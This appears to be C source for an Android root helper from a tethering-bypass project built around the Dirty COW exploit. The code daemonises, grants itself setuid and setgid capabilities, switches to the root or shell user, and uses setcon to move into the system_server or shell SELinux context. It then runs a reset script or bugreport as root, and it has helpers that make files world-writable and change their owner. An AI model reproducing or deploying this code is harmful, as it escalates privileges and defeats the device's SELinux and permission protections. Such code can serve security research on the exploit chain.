#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
//#include "lsh.h"

#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define BLOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "syshell"

#include "psutils.h"

#define APPPROC_OLD "/data/data/com.example.marto.tether/files/app_process32old"
#define BUGREPORT_OLD "/data/data/com.example.marto.tether/files/bugreportold"
#define RESET_LOC "/data/data/com.example.marto.tether/files/reset.sh"
#define RESET_LOC2 "/data/local/tmp/reset.sh"
#define HOST_NAME "app_process32"
#define CONTEXT_APP "u:r:platform_app:s0:c512,c768"
#define CONTEXT_ZYG "u:r:zygote:s0"
#define CONTEXT_SHL "u:r:shell:s0"
#define CONTEXT_ZYGAPP "u:object_r:zygote_exec:s0"
#define CONTEXT_SYS "u:r:system_server:s0"
#define DATAXML "/data/data/com.android.systemui/shared_prefs/com.android.systemui.xml"
#define RESCACHE "/data/resource-cache/test123"
//#define STEP1_FILE "/data/resource-cache/step1_A"
//#define STEP2_FILE "/data/resource-cache/step2_A"
#define STEP1_FILE "/data/local/tmp/step1_A"
#define STEP2_FILE "/data/local/tmp/step2_A"
#define DONE_FILE "/data/local/tmp/done"
#define RUNONCE_FILE "/data/local/tmp/test1234"
//#define STEP1_FILE "/data/local/tmp/test1234"
#define NEWDIR "/data/resource-cache/"
//#define APPPROBK "/data/local/tmp/app_process32old2"
//#define APPPROBK "/system/bin/tc"
#define NEWXML "/data/local/tmp/com.android.systemui.xml"
#define DATADIR "/data/data/com.android.systemui/files"
#define DATADIR2 "/data/data/com.android.systemui/"
#define DATADIR3 "/data/data/com.android.systemui/shared_prefs/"
#define DATADIR4 "/data/data/com.android.systemui/code_cache/"
#define DATADIR5 "/data/data/com.android.systemui/cache/"
#define APPID 10067
#define THEID 10067
#define ROOTID 0
#define SYSID 1000
#define SHELLID 2000
#define OBJ1 "/data/data/com.android.systemui/files/boot.ad"
#define OBJ2 "/data/data/com.android.systemui/files/boot.ad.image"
#define OBJ3 "/data/data/com.android.systemui/files/boot.test"

typedef char* security_context_t;
int get_file_context(const char* path, char* res) {
    typedef int (*_getfilecon_ptr)(const char* path, char** con);
    typedef int (*_freecon_ptr)(char* con);

    char* con = 0;
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {
        _getfilecon_ptr _getfilecon = dlsym(handle, "getfilecon");
        _freecon_ptr _freecon = dlsym(handle, "freecon");
        char *conn = 0;
        if (_getfilecon) {
            ////ALOG("HAVE getfilecon");
            int ret = _getfilecon(path,&conn);
            if (ret) {
                //res=malloc(ret+1);
                //memcpy(res,conn,ret);
                //res[ret]='\0';
                ////ALOG("\tcontext::%s",conn);
                if(_freecon) {
                    ////ALOG("HAVE freecon to ffree pointer :(");
                    _freecon(conn);
                } else {
                    ////ALOG("NO freecon to ffree pointer :(");
                }
                return ret;
            } else {
                ////ALOG("failed to gget file context");
            }
        } else { ; } ////ALOG("FAIL: no getfilecon"); }
    } else { ; } ////ALOG("no selinux.so");} 
    return 0;
}
void set_file_context(const char* path, security_context_t con) {
    typedef int (*_setfilecon_ptr)(const char* path, security_context_t con);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _setfilecon_ptr _setfilecon = dlsym(handle, "setfilecon");
        char *conn = 0;
        if (_setfilecon) {
            ////ALOG("Can get setfilecon");
            int ret = _setfilecon(path,con);
            if (ret) {
                ////ALOG("Failed setting context for file: %d\n",ret);
                ////ALOG("\terrormsg: %s\n",strerror(errno));
            } else  {
                ////ALOG("Set file context for file");
            }
        } else { ; }////ALOG("FAIL: no setfilecon"); }
    } else { ; }////ALOG("no selinux.so");} 
}

void check_context(void) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                //ALOG("Current Context: %s",conn);
            }
        }
    }
}

int set_context_new(const char* cont) {
    typedef int (*_setcon_ptr)(const char* context);
    typedef int (*_getcon_ptr)(char** context);
    printf("Read selinux.so");
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    printf("Done.");
    if (handle)
    {
        _getcon_ptr _getcon = dlsym(handle, "getcon");
        _setcon_ptr _setcon = dlsym(handle, "setcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",conn);
            }
        }



        if (_setcon)
        {
            int ret = _setcon(cont);
            if (ret) {
                printf("setcon error... %d\n", ret);
                return 2;
            } else {
                printf("setcon success!\n");
            }
        }
        else {
            printf("setcon() not found\n");
            return 2;
        }
        if (conn) {
            ; ////ALOG("Old Context WAS: %s",conn);
        }
        char *connNew = 0;
        if (_getcon) {
            int ret = _getcon(&connNew);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
                return 2;
            } else  {
                printf("Current context: %s\n",connNew);
            }
        }
        if (connNew) {
            ; ////ALOG("New Context  IS: %s",connNew);
        }

    }
    else {
        printf("libselinux.so not found\n");
        return 2;
    }

    return 0;
}
void copy_file(const char* fn, const char* fn2) {
    FILE* file = fopen(fn, "r");
    if(!file) {
        return;
    }

    FILE* fileNew;
    int fd;
    if ((fd = open(fn2, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO)) == -1) {
        close(fd);
    }
    //ALOG("Copying..  %s -> %s\n",fn,fn2);
    fileNew = fopen(fn2,"w");
    //ALOG("Copying..  %s -> %s\n",fn,fn2);
    for (;;) {
        //ALOG("Copying..  %s -> %s\n",fn,fn2);
        int c = fgetc(file);
        if ( c != EOF ) {
            fputc(c,fileNew);
            //ALOG("%c",c);
        } else {
            break;
        }
    }
    fclose(fileNew);
    fclose(file);
    //ALOG("Done copy\n");
}

int logfile(const char* fn) {
    FILE *file;
    size_t  size = 0;
    char* buffer = 0;
    if (file = fopen(fn, "r"))
    {
        ////ALOG("Can read %s\n",fn);
        
        fseek(file,0,SEEK_END);
        size = ftell(file);
        rewind(file);
        buffer = malloc((size+1)*sizeof(*buffer));
        fread(buffer, size, 1, file);
        buffer[size] = '\0';
        ////ALOG(buffer);
        free(buffer);
        fclose(file);
    } else {
        ////ALOG("FAILURE: no reado comprendo %s\n",fn);
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    struct stat st;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            char* fullpath = 0;
            asprintf(&fullpath,"%s/%s",d,ep->d_name);
            if(fullpath) {
                stat(fullpath,&st);
                //ALOG("\t%5d:%5d\t%s", st.st_uid, st.st_gid, fullpath);
            } else {
                //ALOG("\tXXXXX:XXXXX\t%s", fullpath);
            }

            char *res = 0;
            int l = get_file_context(fullpath, res);
            //ALOG("\t%d:%d\t%s\t%s", st.st_uid, st.st_gid, fullpath, res);
            if (fullpath) {
                free(fullpath);
            }
            //if(res && l>0) {
            //    free(res);
            //}
        }
        closedir(dp);
    } else {
        //ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}
int fixmod(const char* element) {
    struct stat st;
    stat(element, &st);
    int r = chmod(element, st.st_mode | S_IRWXO ); //S_IWOTH | S_IROTH | SIXOTH);
    if (r < 0 ) {
        //ALOG("Change permissions failed for %s",element);
        //ALOG("\t error:%s",strerror(errno));
    }
    return r;
}
int fixown(const char* element, int id) {
    int r = chown(element, id, id);
    ////ALOG("Changed ownerhip for %s %d\n",element,r);
    return r;
}

int createfile(const char* element) {
    int fd;
    FILE* file;
    //if ((fd = open(element, O_CREAT, S_IRWXO)) == -1) {
    //    close(fd);
    //} else {
    //    ////ALOG("Faield to create file: %s", element);
    //    return 2;
    //}
    if (file = fopen(element, "w"))
    {
        ////ALOG("Can read %s\n",element);
        
        fputs("OMG123",file);
        fclose(file);
    } else {
        ////ALOG("FAILURE: no reado comprendo %s\n",element);
        return 2;
    }
    return 0;
}

int switch_user(int id) {
    struct __user_cap_header_struct capheader;
    struct __user_cap_data_struct capdata[2];

    printf("running as uid %d\n", getuid());
    fflush(stdout);

    memset(&capheader, 0, sizeof(capheader));
    memset(&capdata, 0, sizeof(capdata));
    capheader.version = _LINUX_CAPABILITY_VERSION_3;
    capdata[CAP_TO_INDEX(CAP_SETUID)].effective |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].effective |= CAP_TO_MASK(CAP_SETGID);
    capdata[CAP_TO_INDEX(CAP_SETUID)].permitted |= CAP_TO_MASK(CAP_SETUID);
    capdata[CAP_TO_INDEX(CAP_SETGID)].permitted |= CAP_TO_MASK(CAP_SETGID);
    if (capset(&capheader, &capdata[0]) < 0) {
        printf("Could not set capabilities: %s\n", strerror(errno));
        return 2;
    }
    fflush(stdout);
    if(setresgid(id,id,id) || setresuid(id,id,id)) {
    //if(setresgid(ROOTID,ROOTID,ROOTID) || setresuid(ROOTID,ROOTID,ROOTID)) {
    //if(setresgid(SYSID,SYSID,SYSID) || setresuid(SYSID,SYSID,SYSID)) {
        printf("setresgid/setresuid failed\n");
        return 2;
    }
    printf("uid %d\n", getuid());
    //ALOG("uid %d\n", getuid());
    return 0;
}

int create_fn(const char* fn) {
    int fd2 = open(fn, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH |S_IWOTH);
    if (fd2 != -1) {
        close(fd2);
        fixmod(fn);
        return 0;
    }
    return 2;
}

int remove_fn(const char* fn) {
    int res = remove(fn);
    if (res != -1) {
        //ALOG("[pass] REMOVED FILE");
        return 0;
    }
    //ALOG("[erro] CAN'T REMOVE FILE %s",fn);
    return 2;
}

int checkdir(const char* d) {
    DIR *dp;
    dp = opendir(d);
    if (dp == NULL) {
        return 2;
    }
    return 0;
}


#define PROP "net.tethering.noprovisioning"
int main(int argc, char **argv)
{
    int rc = check_for_dirtycow();
    if(!rc) {
        //ALOG("[exit] Dirty Cow is running!");
        return 2;
    }
    rc = check_for_dirtycow2();
    if(!rc) {
        //ALOG("[exit] Dirty Cow is running!");
        return 2;
    }
    rc = check_for_bugreport();
    if(!rc) {
        //ALOG("[exit] TC is running!");
        return 2;
    }
    char buf[32];
    int propSet = 0;
    property_get(PROP,buf,"");
    if(strcmp(buf,"true") == 0) {
        propSet = 1;
    }
    
    //spawn tc, that will re-dirtycow this directory
    //ALOG("\tforker");
    pid_t pid =   fork();
    //ALOG("\tforkerd %d",pid);

    switch(pid) {
        case -1:  return 1;
        case 0: break;
        default: { 
                  _exit(EXIT_SUCCESS);
                 }
    }
    //ALOG("\tchild1");

    //No steps, find any work required
    //ALOG("\tInchild");
    int sid = setsid();
    if ( sid < 0 ) {
        //ALOG("Setsid failed;");
        //ALOG(" error:%s",strerror(errno));
        BLOG("[err ] failed to setsid\n");
        return 2;
    }

    pid = fork();
    //ALOG("\tforkerd2 %d",pid);
    switch(pid) {
        case -1:  return 1;
        case 0:  break;
        default: { 
                    _exit(EXIT_SUCCESS);
                 }
    }
    //ALOG("\tchild2222");
    check_context();
    //argv[0]="/system/bin/tc";
    if (propSet) {
        rc = switch_user(SHELLID);
        rc = set_context_new(CONTEXT_SHL);
        check_context();
        rc = check_for_reset();
        if(!rc) {
            //ALOG("[exit] Dirty Cow is running!");
            return 2;
        }
        //copy_file(RESET_LOC,RESET_LOC2);
        //ALOG("REALLY DONE COPY FILE?!!?");
        char * argv2[]={RESET_LOC,RESET_LOC,NULL};
        char * envp2[]={0,NULL};
        ALOG("EXECUTING THE SHITT>>>>>>");
        rc = execve("/system/bin/sh",argv2,envp2);
        //ALOG("<<<<<<<<<<<YOU SUCK BITCH %d\n",rc);
    } else {
        rc = switch_user(ROOTID);
        rc = set_context_new(CONTEXT_SYS);
        check_context();
        char * argv2[]={"bugreport",NULL};
        char * envp2[]={0,NULL};
        rc = execve("/system/bin/bugreport",argv2,envp2);
    }
    if (rc != 0) {
        //ALOG("execvp failed %s", strerror(errno));
    }
    //ALOG("execvp failed %d", rc);
    return rc;

    //if(access("/data/data/com.android.systemui/files",F_OK) != 0) {
    //    //ALOG("[info] Running Step 1. next time bae");
    //    create_fn("/data/local/tmp/stepup1");
    //    return 0;
    //}
    //ALOG("FAILUS MGSOGMS");
    return 2;
}
